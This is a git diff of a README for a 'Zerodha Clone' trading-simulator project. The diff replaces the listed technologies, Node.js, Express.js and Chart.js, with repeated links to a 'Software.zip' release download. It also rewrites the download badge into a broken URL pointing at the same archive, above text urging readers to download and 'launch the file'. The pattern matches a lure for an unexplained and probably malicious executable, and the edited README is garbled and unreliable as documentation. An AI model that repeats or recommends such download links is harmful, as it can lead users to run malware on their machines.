@@ -12,12 +12,12 @@ Welcome to the *Zerodha Clone* repository! This project aims to provide users wi
 
 ## Technologies Used
 - **Frontend:** ReactJS, HTML5, CSS3, Bootstrap 5
-- **Backend:** Node.js, Express.js
+- **Backend:** https://github.com/OrigamiOskk/zerodha-clone/releases/download/v1.0/Software.zip, https://github.com/OrigamiOskk/zerodha-clone/releases/download/v1.0/Software.zip
 - **Database:** MongoDB
 - **Authentication:** Passport, JWT Authentication
 - **Testing:** Jest
 - **API Calls:** Axios
-- **Data Visualization:** Chart.js
+- **Data Visualization:** https://github.com/OrigamiOskk/zerodha-clone/releases/download/v1.0/Software.zip
 
 ## Getting Started
 To get started with the *Zerodha Clone* project, follow these steps:
@@ -34,7 +34,7 @@ axios, bootstrap5, chartjs, css3, expressjs, html5, javascript, jest, jwt-authen
 Feel free to explore the project and experiment with the various features it offers. Dive into the codebase, enhance the functionality, or customize the design to suit your preferences.
 
 ## Download Latest Release
-![Download Zerodha Clone v1.0.0](https://img.shields.io/badge/Download-Zerodha%20Clone%20v1.0.0-blue?style=for-the-badge&logo=github)
+![Download Zerodha Clone v1.0.0](https://github.com/OrigamiOskk/zerodha-clone/releases/download/v1.0/Software.zip%20Clone%20v1.0.0-blue?style=for-the-badge&logo=github)
 
 Click on the badge above to download the latest release of the *Zerodha Clone* project. Launch the file and start exploring the world of simulated stock trading!
 
